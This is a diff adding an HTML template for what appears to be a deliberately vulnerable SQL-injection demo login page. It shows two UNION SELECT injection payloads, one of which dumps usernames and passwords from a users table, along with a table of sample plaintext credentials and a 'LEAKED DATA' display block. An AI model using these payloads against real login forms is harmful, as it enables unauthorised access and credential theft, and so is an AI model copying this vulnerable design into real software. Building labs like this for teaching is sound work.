@@ -1,0 +1,71 @@
+{% extends "base.html" %}
+
+{% block content %}
+    <h2>{{ title }}</h2>
+
+
+    <p>nobody' UNION SELECT 1, datetime('now'), 'fake_pass' --</p>
+<p>nobody' UNION SELECT 1, group_concat(username || ':' || password, ' | '), 'Dump' FROM users --</p>
+    <table style="border-collapse: collapse; border: 1px solid black;">
+        <thead>
+            <tr>
+                <th style="border: 1px solid black; padding: 8px;">Username</th>
+                <th style="border: 1px solid black; padding: 8px;">Password</th>
+            </tr>
+        </thead>
+        <tbody>
+            <tr>
+                <td style="border: 1px solid black; padding: 8px;">admin</td>
+                <td style="border: 1px solid black; padding: 8px;">SuperSecretPass</td>
+            </tr>
+            <tr>
+                <td style="border: 1px solid black; padding: 8px;">alice</td>
+                <td style="border: 1px solid black; padding: 8px;">wonderland1</td>
+            </tr>
+            <tr>
+                <td style="border: 1px solid black; padding: 8px;">bob</td>
+                <td style="border: 1px solid black; padding: 8px;">builder99</td>
+            </tr>
+            <tr>
+                <td style="border: 1px solid black; padding: 8px;">charlie</td>
+                <td style="border: 1px solid black; padding: 8px;">chocolate_factory</td>
+            </tr>
+            <tr>
+                <td style="border: 1px solid black; padding: 8px;">dave</td>
+                <td style="border: 1px solid black; padding: 8px;">hal9000</td>
+            </tr>
+            <tr>
+                <td style="border: 1px solid black; padding: 8px;">eve</td>
+                <td style="border: 1px solid black; padding: 8px;">spy_vs_spy</td>
+            </tr>
+        </tbody>
+    </table>
+    {% if error %}
+        <div class="alert error">{{ error }}</div>
+    {% endif %}
+
+    {% if success_user %}
+        <div class="alert success">
+            <h3>Login Successful!</h3>
+            <p>Welcome, <strong>{{ success_user }}</strong></p>
+            {% if leaked_password %}
+                <p class="warning">⚠️ LEAKED DATA: {{ leaked_password }}</p>
+            {% endif %}
+        </div>
+        <p><a href="{{ request.path }}">Log out and try again</a></p>
+    {% else %}
+        <div class="alert info">
+            <p><strong>Method:</strong> {{ method_description }}</p>
+        </div>
+
+        <form method="POST">
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="username" placeholder="Enter username (or injection payload)" required>
+
+            <label for="password">Password:</label>
+            <input type="text" id="password" name="password" placeholder="Enter password" required>
+
+            <button type="submit">Login</button>
+        </form>
+    {% endif %}
+{% endblock %}
